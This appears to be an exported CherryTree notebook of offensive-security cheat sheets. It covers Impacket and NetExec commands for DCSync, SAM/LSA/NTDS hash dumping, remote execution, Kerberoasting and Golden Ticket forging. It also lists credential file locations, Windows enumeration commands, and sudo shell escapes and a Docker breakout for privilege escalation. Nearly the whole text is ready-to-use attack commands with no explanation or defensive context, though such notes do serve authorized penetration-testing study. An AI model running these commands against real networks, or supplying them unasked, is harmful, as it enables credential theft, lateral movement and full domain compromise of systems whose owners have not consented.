      <node name="Impacket Cheatsheet" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt; -just-dc
# DCSync and dump NTDS.dit hashes
--------------------------------------------------
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
# Remote execution via SMB named pipes (Ports 445)
--------------------------------------------------
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
# Remote execution via WMI (Port 135)
--------------------------------------------------
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
# Remote execution via SMB service creation (Port 445)
--------------------------------------------------
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt; &quot;whoami&quot;
# Remote execution via Task Scheduler (Port 445)
--------------------------------------------------
GetUserSPNs.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt; -dc-ip &lt;DC_IP&gt; -request
# Kerberoasting: Request TGS tickets for offline cracking
--------------------------------------------------
GetNPUsers.py &lt;DOMAIN&gt;/ -usersfile users.txt -dc-ip &lt;DC_IP&gt; -no-pass
# AS-REP Roasting: Request TGTs for users without pre-auth
--------------------------------------------------
getTGT.py &lt;DOMAIN&gt;/&lt;USER&gt; -hashes :&lt;NTLM_HASH&gt; -dc-ip &lt;DC_IP&gt;
# Request TGT using Pass-The-Hash
--------------------------------------------------
ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; Administrator
# Forge Golden Ticket
--------------------------------------------------
</rich_text>
      </node>

      <node name="NetExec (nxc) Cheatsheet" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>nxc smb &lt;TARGET_IP&gt; -u user -p pass --shares
# Enumerate SMB shares and access rights
--------------------------------------------------
nxc smb &lt;TARGET_IP&gt; -u user -p pass --sam
# Dump SAM database hashes
--------------------------------------------------
nxc smb &lt;TARGET_IP&gt; -u user -p pass --lsa
# Dump LSA secrets (plaintext creds)
--------------------------------------------------
nxc smb &lt;DC_IP&gt; -u user -p pass --ntds
# DCSync and dump all domain hashes
--------------------------------------------------
nxc smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus
# Spider and map all readable share contents
--------------------------------------------------
nxc winrm &lt;TARGET_IP&gt; -u user -p pass
# Test WinRM authentication and execute commands
--------------------------------------------------
nxc mssql &lt;TARGET_IP&gt; -u sa -p pass
# Test MSSQL authentication and execute queries
--------------------------------------------------
nxc ldap &lt;DC_IP&gt; -u user -p pass --bloodhound -c All
# Collect BloodHound data via LDAP
--------------------------------------------------
</rich_text>
      </node>

      <node name="Windows System Commands" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>systeminfo
# View OS version, architecture, and hotfixes
--------------------------------------------------
wmic qfe list brief
# List installed patches and updates
--------------------------------------------------
net user
# List local users
--------------------------------------------------
net localgroup administrators
# List local administrators
--------------------------------------------------
net accounts
# View password and lockout policies
--------------------------------------------------
tasklist /SVC
# List running processes and associated services
--------------------------------------------------
netstat -ano
# List active network connections and listening ports
--------------------------------------------------
whoami /all
# View current user SID, groups, and token privileges
--------------------------------------------------
wmic ntdomain get Caption,DomainName,DomainControllerAddress
# Dump domain and trust layout via WMI
--------------------------------------------------
</rich_text>
      </node>

      <node name="Key File Locations" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>/etc/passwd
# Linux: User accounts database
--------------------------------------------------
/etc/shadow
# Linux: Password hashes (requires root)
--------------------------------------------------
/var/log/auth.log
# Linux: Authentication logs (target for log poisoning)
--------------------------------------------------
C:\Windows\System32\config\SAM
# Windows: Local account password hashes
--------------------------------------------------
C:\Windows\System32\config\SYSTEM
# Windows: Boot key required to decrypt SAM
--------------------------------------------------
C:\Windows\Panther\unattend.xml
# Windows: Automated deployment credentials
--------------------------------------------------
C:\inetpub\wwwroot\web.config
# Windows/IIS: Database connection strings
--------------------------------------------------
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Windows: PowerShell command history
--------------------------------------------------
</rich_text>
      </node>

      <node name="GTFOBins Quick Reference" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>sudo find . -exec /bin/bash \; -p
# Sudo: Find shell escape
--------------------------------------------------
sudo vim -c &apos;!/bin/bash&apos;
# Sudo: Vim shell escape
--------------------------------------------------
sudo awk &apos;BEGIN {system(&quot;/bin/bash&quot;)}&apos;
# Sudo: Awk shell escape
--------------------------------------------------
sudo python3 -c &apos;import os; os.system(&quot;/bin/bash&quot;)&apos;
# Sudo: Python shell escape
--------------------------------------------------
sudo env /bin/bash
# Sudo: Env shell escape
--------------------------------------------------
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# Sudo: Tar checkpoint shell escape
--------------------------------------------------
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Docker group breakout to host root
--------------------------------------------------
</rich_text>
      </node>
